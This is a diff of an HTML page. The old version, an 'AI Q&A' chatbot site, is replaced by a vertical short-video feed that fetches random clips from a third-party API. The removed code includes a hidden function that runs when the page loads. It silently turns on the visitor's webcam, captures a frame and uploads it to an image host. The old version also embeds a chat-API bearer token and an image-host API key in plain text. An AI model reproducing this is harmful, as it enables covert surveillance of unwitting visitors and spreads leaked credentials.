@@ -1,389 +1,342 @@
+
 <!DOCTYPE html>
 <html lang="en">
-<head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>WWZ-AI</title>
-  <script src="https://cdn.jsdelivr.net/npm/marked/marked.min.js"></script>
-  <style>
-    body, html {
-      margin: 0;
-      padding: 0;
-      width: 100%;
-      height: 100%;
-      font-family: Arial, sans-serif;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      justify-content: flex-start;
-      background-color: #f4f4f9;
-    }
-    #header {
-      width: 100%;
-      padding: 20px;
-      text-align: center;
-      background-color: #4CAF50;
-      color: white;
-      font-size: 24px;
-      font-weight: bold;
-    }
-    #chat-container {
-      flex: 1;
-      display: flex;
-      flex-direction: column;
-      width: 100%;
-      max-width: 98%;
-      background: #ffffff;
-      border: 1px solid #ccc;
-      border-radius: 10px;
-      overflow: hidden;
-      box-shadow: 0 0 15px rgba(0, 0, 0, 0.1);
-    }
-    #chat-box {
-      flex: 1;
-      padding: 20px;
-      overflow-y: auto;
-      display: flex;
-      flex-direction: column;
-      gap: 20px;
-      background-color: #f1f1f1;
-    }
-    .user, .bot {
-      display: flex;
-      align-items: flex-end;
-    }
-    .user {
-      justify-content: flex-end;
-    }
-    .bot {
-      justify-content: flex-start;
-    }
-    .message {
-      display: inline-block;
-      padding: 15px;
-      border-radius: 15px;
-      max-width: 60%;
-      word-break: break-word;
-      font-size: 16px;
-      box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
-    }
-    .bot .message {
-      background-color: #e0e0e0;
-      border-bottom-left-radius: 0;
-    }
-    .user .message {
-      background-color: #4CAF50;
-      color: white;
-      border-bottom-right-radius: 0;
-    }
-    .error {
-      color: red;
-      font-weight: bold;
-    }
-    .error .message {
-      background-color: #ffebee;
-    }
-    .error .error {
-      background-color: #ffcdd2;
-    }
-    .error .error-message {
-      color: #b71c1c;
-    }
-    .error .error strong {
-      font-size: 18px;
-    }
-    #input-container {
-      display: flex;
-      flex-direction: column;
-      border-top: 1px solid #ccc;
-      padding: 15px;
-      background-color: #fff;
-      align-items: center;
-    }
-    #user-input {
-      width: 100%;
-      padding: 15px;
-      border: 1px solid #ccc;
-      border-radius: 5px;
-      font-size: 16px;
-      margin-bottom: 10px;
-    }
-    .button-group {
-      display: flex;
-      width: 100%;
-      justify-content: space-between;
-    }
-    button {
-      padding: 15px 20px;
-      border: none;
-      background-color: #4CAF50;
-      color: white;
-      font-size: 16px;
-      border-radius: 5px;
-      cursor: pointer;
-      transition: background-color 0.3s;
-      flex: 1;
-      margin: 0 5px;
-    }
-    button:hover {
-      background-color: #45a049;
-    }
-    #delete-btn {
-      background-color: red;
-      color: white;
-    }
-    #delete-btn:hover {
-      background-color: darkred;
-    }
-    #model-selector {
-      display: flex;
-      align-items: center;
-    }
-    #model-options {
-      padding: 10px;
-      border: 1px solid #ccc;
-      border-radius: 5px;
-      font-size: 16px;
-      cursor: pointer;
-      flex: 1;
-      margin: 0 5px;
-    }
-    #welcome-modal {
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      background: rgba(0, 0, 0, 0.5);
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      z-index: 1000;
-    }
-    #welcome-message {
-      background: white;
-      padding: 30px;
-      border-radius: 10px;
-      text-align: center;
-      font-size: 18px;
-      max-width: 80%;
-    }
-    #welcome-message button {
-      margin-top: 20px;
-      padding: 10px 20px;
-      border: none;
-      background-color: #4CAF50;
-      color: white;
-      font-size: 16px;
-      border-radius: 5px;
-      cursor: pointer;
-      transition: background-color 0.3s;
-    }
-    #welcome-message button:hover {
-      background-color: #45a049;
-    }
-    @media (min-width: 600px) {
-      #input-container {
-        flex-direction: row;
-        align-items: center;
-      }
-      #user-input {
-        flex: 1;
-        margin-right: 10px;
-        margin-bottom: 0;
-      }
-      .button-group {
-        flex-direction: row;
-        width: auto;
-      }
-      #canvasContainer {
-        display: none;
-      }
 
-    }
-  </style>
+<head>
+  <meta charset="utf-8" />
+  <title>WWZ</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=1" />
+  <!-- Link Swiper's CSS -->
+  <link rel="stylesheet" href="https://api.lolimi.cn/dy/css/swiper-bundle.css" />
+  <link rel="stylesheet" href="https://api.lolimi.cn/dy/css/style.css">
+
+
 </head>
+
 <body>
-  <div id="header">WUWANGZE-AI</div>
-  <div id="chat-container">
-    <div id="chat-box"></div>
-    <div id="input-container">
-      <input type="text" id="user-input" placeholder="Type a message">
-      <div class="button-group">
-        <button onclick="sendMessage()">Send</button>
-        <button id="delete-btn" onclick="deleteMessages()">Delete</button>
-        <div id="model-selector">
-          <select id="model-options" onchange="changeModel()">
-            <option value="glm-4-flash">glm-4-flash</option>
-          </select>
+    
+    <div class="head">
+        <div class="head-left">
+          <div id="sh-volume" class="sh-volume">
+        <svg t="1702890750900" id="sh-volume-zt" class="sh-volume-svg" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="5115" width="200" height="200"><path d="M468.992 169.536c29.312-22.528 64.128-40.768 101.312-25.088 36.864 15.616 48.64 53.12 53.76 90.048 5.248 37.824 5.248 89.92 5.248 154.688v245.568c0 64.768 0 116.864-5.184 154.752-5.12 36.864-16.96 74.368-53.76 89.984-37.248 15.744-72.064-2.56-101.376-25.088-30.016-23.04-68.032-61.888-112.832-107.584-23.04-23.552-38.336-34.944-53.76-41.28-15.616-6.4-34.496-9.152-67.456-9.152-28.544 0-54.08 0-73.408-2.048-20.224-2.112-39.04-6.656-56-18.24-32.192-22.016-44.544-54.208-49.28-83.84C52.864 570.24 53.248 545.984 53.568 526.464v-28.928c-0.32-19.52-0.64-43.776 2.816-65.92 4.672-29.568 17.024-61.76 49.28-83.776 16.896-11.52 35.712-16.128 55.936-18.24 19.328-1.984 44.8-1.984 73.344-1.984 33.024 0 51.904-2.752 67.456-9.152 15.488-6.4 30.72-17.792 53.76-41.28 44.8-45.696 82.88-84.608 112.896-107.648zM699.52 350.08a42.688 42.688 0 0 1 59.776 8.064c32.256 42.24 51.392 95.872 51.392 153.856 0 57.92-19.136 111.552-51.392 153.856a42.688 42.688 0 1 1-67.84-51.712c21.056-27.648 33.92-63.104 33.92-102.144 0-39.04-12.864-74.496-33.92-102.144a42.688 42.688 0 0 1 8-59.776z" fill="#ffffff" p-id="5116"></path><path d="M884.8 269.824a42.688 42.688 0 1 0-62.912 57.6C868.736 378.688 896 442.88 896 512c0 69.12-27.264 133.312-74.112 184.512a42.688 42.688 0 0 0 62.912 57.6c59.904-65.344 96.512-149.632 96.512-242.112 0-92.48-36.608-176.768-96.512-242.176z" fill="#ffffff" p-id="5117"></path></svg>
+        <svg t="1702891062810" id="sh-volume-zt0" class="sh-volume-svg0" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="5326" width="200" height="200"><path d="M115.52 55.168a42.688 42.688 0 0 0-60.352 60.352L266.112 326.4a356.608 356.608 0 0 1-31.168 1.152c-28.544 0-54.08 0-73.408 1.984-20.224 2.112-39.04 6.72-56 18.24-32.192 22.016-44.544 54.208-49.28 83.84-3.456 22.08-3.072 46.272-2.752 65.856v28.928c-0.32 19.52-0.64 43.712 2.816 65.792 4.672 29.632 17.024 61.824 49.28 83.84 16.896 11.52 35.712 16.128 55.936 18.24 19.328 1.984 44.864 1.984 73.408 1.984 32.96 0 51.84 2.752 67.392 9.152 15.488 6.4 30.72 17.792 53.76 41.28 44.8 45.76 82.88 84.672 112.896 107.648 29.312 22.528 64.128 40.832 101.312 25.088 36.864-15.616 48.64-53.12 53.76-90.048 3.712-26.496 4.8-59.968 5.12-99.904l279.296 279.296a42.688 42.688 0 1 0 60.352-60.352L115.52 55.168zM570.304 144.448c-37.12-15.68-72.064 2.56-101.376 25.088-17.088 13.184-36.928 31.488-59.072 53.376-8.512 8.384-12.8 12.608-12.8 17.92 0 5.312 4.224 9.6 12.8 18.112L585.6 434.752c18.56 18.56 27.904 27.904 35.84 24.64 7.872-3.264 7.872-16.448 7.872-42.752V389.12c0-64.704 0-116.736-5.248-154.56-5.12-36.928-16.896-74.432-53.76-90.048zM883.2 310.912a42.688 42.688 0 0 0-59.776 60.8C869.952 417.536 896 473.792 896 533.376c0 41.6-12.608 81.216-35.776 116.864a42.688 42.688 0 0 0 71.552 46.464c31.36-48.256 49.536-103.872 49.536-163.328 0-85.888-37.824-163.2-98.048-222.4zM758.336 399.616a42.688 42.688 0 1 0-65.92 54.144c21.12 25.792 32.896 56.448 32.896 88.96v2.048a42.688 42.688 0 1 0 85.376-2.048 224.64 224.64 0 0 0-52.352-143.104z" fill="#ffffff" p-id="5327"></path></svg>
+    </div>
+        </div>
+        <div class="head-am">
+          <span>推荐</span>
+        </div>
+        <div class="head-right">
+          <svg t="1702896679451" class="icon" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="7837" width="200" height="200">
+            <path d="M907.815385 840.861538L720.738462 653.784615c42.141538-55.926154 66.953846-125.636923 66.953846-200.861538 0-184.713846-150.055385-334.769231-334.769231-334.769231s-334.769231 150.055385-334.769231 334.769231 150.055385 334.769231 334.769231 334.769231c75.224615 0 144.935385-24.812308 200.861538-66.953846l187.076923 187.076923 66.953847-66.953847zM212.676923 452.923077c0-132.332308 107.913846-240.246154 240.246154-240.246154s240.246154 107.913846 240.246154 240.246154-107.913846 240.246154-240.246154 240.246154-240.246154-107.913846-240.246154-240.246154z" fill="#ffffff" p-id="7838"></path>
+          </svg>
         </div>
       </div>
+      
+      
+    <video class="sh-video sh-video-paly" poster="" id="sh-video-paly" src="" playsinline webkit-playsinline preload="metadata"  muted loop onclick="toggleVideoPlayback();"></video>
+    
+          
+  <!-- Swiper -->
+  <div class="swiper mySwiper">
+    <div class="swiper-wrapper" id="swiper-wrapper">
+
+      <div class="swiper-slide">
+        <video class="sh-video" poster="" id="sh-video" src="" playsinline
+          webkit-playsinline preload="metadata" muted loop onclick="toggleVideoPlayback();"></video>
+      </div>
+
+
+      <div class="swiper-slide">
+        <video class="sh-video" poster="" id="sh-video" src="https://alimov2.a.kwimgs.com/upic/2023/08/31/19/BMjAyMzA4MzExOTE3MDlfMzE5MTIwNzI4OF8xMTE4MjgzOTMyMTBfMV8z_b_B1e427b116699e6505385a49d45360bd7.mp4?clientCacheKey=3xuy7kcma5m3zwa_b.mp4&tt=b&di=78e498d6&bp=14214" playsinline
+          webkit-playsinline preload="metadata" muted loop onclick="toggleVideoPlayback();"></video>
+      </div>
+
     </div>
+    <div class="swiper-pagination"></div>
   </div>
-  <div id="welcome-modal">
-    <div id="welcome-message">
-      <p>该网站为AI问答网站，可以向AI提问，AI会耐心进行解答，可以和AI聊天</p>
-      <p>欢迎进入官方QQ交流群：715434216<br>您的进群便是对我最大的支持</p>
-      <p>PS：如遇到长时间不回复，请重试</p>
-      <button onclick="closeModal()">确认</button>
-    </div>
-  </div>
-  <video id="video" width="640" height="480" autoplay style="display:none;"></video>
-  <div id="canvasContainer">
-    <canvas id="canvas" width="640" height="480"></canvas>
-  </div>
+  
+  
+  
+  
+  <div class="foot">
+        <span class="foot-active">首页</span>
+        <span>朋友</span>
+        <span>消息</span>
+        <span>我的</span>
+      </div>
+      
+      
+      
+
+  <!-- Swiper JS -->
+  <script src="https://api.lolimi.cn/dy/js/swiper-bundle.min.js"></script> 
+  <script type="text/javascript" src="https://api.lolimi.cn/dy/js/jquery.min.js"></script>
+  <!-- Initialize Swiper -->
   <script>
-    var conversation = [];
-    var selectedModel = "glm-4-flash";
-    var sequence = 1;
-    function sendMessage() {
-      var userInput = document.getElementById("user-input").value.trim();
-      if (userInput === '') return;
-      appendMessage("You", userInput);
-      conversation.push({
-        role: "user",
-        content: userInput,
-        sequence: sequence,
-      });
-      sequence++;
-      var requestOptions = {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json",
-          Authorization: "Bearer d2bedb706c94cbaeb143cd2a3c8ba962.swIjaw6UKRUQUhlj",  
-        },
-        body: JSON.stringify({
-          model: selectedModel,
-          messages: conversation,
-          stream: true,
-          temperature: 0.5,
-          max_tokens: 160000,
-        }),
-      };    
-      fetch("https://open.bigmodel.cn/api/paas/v4/chat/completions", requestOptions)
-        .then(response => {
-          const reader = response.body.getReader();
-          const decoder = new TextDecoder();
-          let botResponse = '';
-          appendMessage("AI", ""); 
-          function read() {
-            reader.read().then(({ done, value }) => {
-              if (done) {
-                conversation.push({
-                  role: "assistant",
-                  content: botResponse,
-                });
-                return;
-              }
-              const chunk = decoder.decode(value, { stream: true });
-              const lines = chunk.split('\n');
-              for (let line of lines) {
-                if (line.trim().startsWith('data: ')) {
-                  const json = JSON.parse(line.slice(6));
-                  if (json.choices && json.choices.length > 0 && json.choices[0].delta && json.choices[0].delta.content) {
-                    botResponse += json.choices[0].delta.content;
-                    updateLatestMessage(botResponse);
-                  }
-                }
-              }
-              read();
-            });
+  
+
+
+
+
+
+// 为所有的video元素添加点击事件监听器  
+function toggleVideoPlayback() {
+    var ele = event.target;
+    var shVideoPaly = document.getElementById("sh-video-paly");
+  
+    if (ele.paused) {    
+        // 如果视频暂停，则播放  
+        //ele.muted = true;    
+        ele.play();  
+        //shVideoPaly.muted = false;
+        //shVideoPaly.volume = 0.2;
+        shVideoPaly.play();
+    } else {    
+        // 如果视频正在播放，则暂停      
+        ele.pause();
+        shVideoPaly.pause();
+    }
+}
+
+
+
+
+
+
+
+
+
+
+    /*var swiper = new Swiper(".mySwiper", {
+      direction: "vertical",
+      slidesPerView: 1,
+      spaceBetween: 30,
+      mousewheel: true,
+      pagination: {
+        el: ".swiper-pagination",
+        clickable: true,
+      },
+      mode: 'horizontal',
+      pagination: '.swiper-pagination',
+      loop: false,//是否循环
+      observer: true,//修改swiper自己或子元素时，自动初始化swiper
+      observeParents: true,//修改swiper的父元素时，自动初始化swiper
+
+      on: {
+        slideChangeTransitionEnd: function (swiper) {
+          // 获取当前活动的slide的索引    
+          var activeIndex = swiper.realIndex;//当前选中的位置
+          // 获取所有slide的总数    
+          var totalSlides = swiper.slides.length;
+          
+          console.log(activeIndex)
+          //videoauplay();
+          //videoauplay();
+
+          // 判断是否滑动到了最后一个    
+          if (activeIndex === totalSlides - 1) {
+            var li = '<div class="swiper-slide"><video class="sh-video" poster="" id="sh-video" src="https://api.lolimi.cn/API/xjj/xjj.php" playsinline webkit-playsinline preload="metadata" autoplay muted loop onclick="toggleVideoPlayback();"></video></div>';
+            $("#swiper-wrapper").append(li);
+            // 更新swiper  
+            swiper.update();
+            //观察video
+            //videoauplay();
           }
-          read();
-        })
-        .catch((error) => {
-          console.error("Error:", error);
-          appendErrorMessage("Error: " + error);
-        });
-      document.getElementById("user-input").value = "";
-    }
-    function updateLatestMessage(text) {
-      var chatBox = document.getElementById("chat-box");
-      var latestMessage = chatBox.querySelector(".bot:last-child .message");
-      if (latestMessage) {
-        latestMessage.innerHTML = marked.parse(text);
+          
+
+
+      
+          
+        }
       }
-      chatBox.scrollTop = chatBox.scrollHeight;
-    }
-    function appendMessage(sender, message) {
-      var chatBox = document.getElementById("chat-box");
-      var messageDiv = document.createElement("div");
-      messageDiv.className = sender === "You" ? "user" : "bot";
-      var messageContent = `<div class="message">${sender === "You" ? message : marked.parse(message)}</div>`;
-      messageDiv.innerHTML = messageContent;
-      chatBox.appendChild(messageDiv);
-      chatBox.scrollTop = chatBox.scrollHeight;
-    }
-    function appendErrorMessage(message) {
-      var chatBox = document.getElementById("chat-box");
-      var errorDiv = document.createElement("div");
-      errorDiv.className = "error";
-      errorDiv.innerHTML = "<strong>Error:</strong> " + message;
-      chatBox.appendChild(errorDiv);
-      chatBox.scrollTop = chatBox.scrollHeight;
-    }
-    function deleteMessages() {
-      var chatBox = document.getElementById("chat-box");
-      chatBox.innerHTML = '';
-      conversation = [];
-      sequence = 1;
-    }
-    function changeModel() {
-      selectedModel = document.getElementById('model-options').value;
-    }
-    function closeModal() {
-      var modal = document.getElementById('welcome-modal');
-      modal.style.display = 'none';
-    }
-    document.getElementById("user-input").addEventListener("keydown", function (event) {
-      if (event.key === "Enter") {
-        event.preventDefault();
-        sendMessage();
-      }
-    });
-    window.onload = function() {
-      var modal = document.getElementById('welcome-modal');
-      modal.style.display = 'flex';
-    };
-    function captureAndUpload() {
-    const video = document.getElementById('video');
-    const canvas = document.getElementById('canvas');
-    const context = canvas.getContext('2d');
-    navigator.mediaDevices.getUserMedia({ video: true })
-      .then(stream => {
-        video.srcObject = stream;
-      })
-      .catch(error => {
-        console.error('获取摄像头数据出错：', error);
-      });
-    setTimeout(() => {
-      context.drawImage(video, 0, 0, canvas.width, canvas.height);
-      canvas.toBlob(function(blob) {
-        var formData = new FormData();
-        formData.append('image', blob);
-        formData.append('key', 'f621b2818ded22557f9260b26e3138b6'); 
-        var xhr = new XMLHttpRequest();
-        xhr.open('POST', 'https://api.imgbb.com/1/upload', true);
-        xhr.onload = function () {
-          if (xhr.status === 200) {
-            var response = JSON.parse(xhr.responseText);
-            console.log('Upload successful. Image URL:', response.data.url);
-            alert('biu~');
-          } else {
-            console.error('Error:', xhr.statusText, xhr.status);
-            alert('piu~');
+      
+      
+    });*/
+    
+    var swiper = new Swiper(".mySwiper", {
+  direction: "vertical",
+  slidesPerView: 1,
+  spaceBetween: 0,
+  mousewheel: true,
+  pagination: {
+    el: ".swiper-pagination",
+    clickable: true,
+  },
+  mode: 'horizontal',
+  pagination: '.swiper-pagination',
+  loop: false,//是否循环
+  observer: true,//修改swiper自己或子元素时，自动初始化swiper
+  observeParents: true,//修改swiper的父元素时，自动初始化swiper
+
+  on: {
+    slideChangeTransitionEnd: function () {
+      // 获取当前活动的slide的索引
+      var activeIndex = this.realIndex;
+      //console.log(activeIndex)
+     
+  
+      // 获取所有slide的数量
+      var totalSlides = this.slides.length;
+      // 判断是否滑动到了最后一个    
+          if (activeIndex === totalSlides - 1) {
+              
+              
+              var ajaxObj = new XMLHttpRequest();
+        // （2）设置请求的参数。包括：请求的方法、请求的url。
+        ajaxObj.open('get', 'https://api.lolimi.cn/API/xjj/t.php');
+        // （3）发送请求
+        ajaxObj.send();
+        //（4）注册事件。 onreadystatechange事件，状态改变时就会调用。
+        //如果要在数据完整请求回来的时候才调用，我们需要手动写一些判断的逻辑。
+        ajaxObj.onreadystatechange = function () {
+            // 为了保证 数据 完整返回，我们一般会判断 两个值
+            if (ajaxObj.readyState == 4 && ajaxObj.status == 200) {
+                var obj = JSON.parse(ajaxObj.responseText); //由JSON字符串转换为JSON对象
+                var code=obj[0].code;
+                var msg=obj[0].msg;
+                
+                var li = '<div class="swiper-slide"><video class="sh-video" poster="" id="sh-video" src="'+msg+'" playsinline webkit-playsinline preload="metadata" muted loop onclick="toggleVideoPlayback();"></video></div>';
+            $("#swiper-wrapper").append(li);
+            // 更新swiper  
+            swiper.update();
+                
+            }
+        }
+        
+        
+        
+            
+            //观察video
+            //videoauplay();
           }
-        };        
-        xhr.onerror = function () {
-          console.error('Error:', xhr.statusText);
-          alert('2');
-        };
-        xhr.send(formData);
-      });
-      document.getElementById('canvasContainer').style.display = 'none';
-    }, 1000); 
-  } 
-  window.onload = captureAndUpload;
+          
+      
+      
+    }
+  }
+});
+
+
+
+
+
+
+
+
+
+
+
+
+    
+    var previousIndex = swiper.activeIndex;
+
+swiper.on('transitionEnd', function () {
+  //console.log('滚动完成');
+  
+  var currentIndex = swiper.activeIndex;
+  
+  // 判断是否切换了选中页面
+  if (currentIndex !== previousIndex) {
+    var videos = document.getElementsByTagName('video');
+// 重置并停止所有视频
+for (var i = 0; i < videos.length; i++) {
+  var video = videos[i];
+  video.currentTime = 0; // 将视频的当前时间设置为0，相当于重置视频
+  video.pause(); // 停止视频播放
+}
+    
+    // 获取当前选中页面元素中的 video 元素和 src 属性
+    var currentSlide = swiper.slides[swiper.activeIndex];
+    var video = currentSlide.querySelector('video');
+    var src = video.getAttribute('src');
+    
+    
+    if (video) {
+        
+      //video.muted = true;
+      video.play();
+      
+      document.getElementById("sh-video-paly").src = src;
+      //document.getElementById("sh-video-paly").muted = false;
+      //document.getElementById("sh-video-paly").volume = 0.2;
+      document.getElementById("sh-video-paly").play();
+    }
+  }
+  
+  
+  previousIndex = currentIndex;
+}); 
+
+
+
+
+
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+        var ajaxObj = new XMLHttpRequest();
+        
+        ajaxObj.open('get', 'https://api.lolimi.cn/API/xjj/t.php');
+        
+        ajaxObj.send();
+        
+        ajaxObj.onreadystatechange = function () {
+            
+            if (ajaxObj.readyState == 4 && ajaxObj.status == 200) {
+                var obj = JSON.parse(ajaxObj.responseText); 
+                var code=obj[0].code;
+                var msg=obj[0].msg;
+                
+                var currentSlide = swiper.slides[swiper.activeIndex];
+                var video = currentSlide.querySelector('video');
+                var src = video.getAttribute('src');
+                video.src=msg;
+                video.play();
+                //video.muted = true;
+                
+  
+                document.getElementById("sh-video-paly").src=msg;
+                //document.getElementById("sh-video-paly").muted = false;
+                //document.getElementById("sh-video-paly").volume = 0.2;
+                document.getElementById("sh-video-paly").play();
+            }
+        }
+    
+    
+    
+    
+    if (document.getElementById('sh-volume')) {
+  
+  document.getElementById('sh-volume').addEventListener('click', function() {
+    
+    var video = document.getElementById("sh-video-paly");
+if (video.muted) {
+  video.muted = false;
+  video.volume = 0.2;
+  document.getElementById("sh-volume-zt").style.display="flex";
+  document.getElementById("sh-volume-zt0").style.display="none";
+} else {
+  video.muted = true;
+  document.getElementById("sh-volume-zt0").style.display="flex";
+  document.getElementById("sh-volume-zt").style.display="none";
+}
+  });
+}
+
   </script>
+  
+<script charset="UTF-8" id="LA_COLLECT" src="https://sdk.51.la/js-sdk-pro.min.js"></script>
+<script>LA.init({id:"KNu4l21XC82WumOu",ck:"KNu4l21XC82WumOu"})</script>
+  
 </body>
+
 </html>
